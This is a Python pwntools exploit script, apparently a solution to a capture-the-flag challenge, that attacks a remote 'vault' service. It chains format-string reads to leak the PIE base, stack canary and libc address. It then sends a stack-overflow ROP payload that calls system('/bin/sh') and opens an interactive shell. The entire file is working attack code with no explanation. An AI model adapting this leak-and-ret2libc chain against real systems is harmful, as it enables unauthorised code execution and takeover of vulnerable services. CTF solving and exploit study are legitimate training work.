from pwn import *

#context.log_level = 'CRITICAL'
context.binary = binary = ELF('./vault', checksec=False)

#p = process()
p = remote('play.scriptsorcerers.xyz', 10264)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'vault? ', b'|%69$p|%23$p|')
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'|')
leak = int(p.recvuntil(b'|')[:-1], 16)
binary.address = leak - 0x1090
print(f'pie leak @ {hex(leak)}')
print(f'pie base @ {hex(binary.address)}')

canary = leak = int(p.recvuntil(b'|')[:-1], 16)
print(f'canary @ {hex(canary)}')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'vault? ', p32(binary.got.puts)+b'|%7$s|')
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'|')
leak = u32(p.recv(4))
libc_base = leak - 0x07dd60
print(f'puts() @ {hex(leak)}')
print(f'libc base @ {hex(libc_base)}')

rop = b'A' * 0x40 # Padding to EIP
rop += p32(canary) # Restore canary
rop += b'B' * 0xc # Junk for saved registers
rop += p32(libc_base+0x051f50) # system()
rop += b'C' * 0x4 # Junk return address for system()
rop += p32(libc_base+0x1cce52) # Pointer to "/bin/sh" (argument for system())

p.sendlineafter(b'> ', b'1')
p.sendline(rop)
p.sendlineafter(b'> ', b'3')

p.clean()
print('*** SHELL ***')
p.interactive()
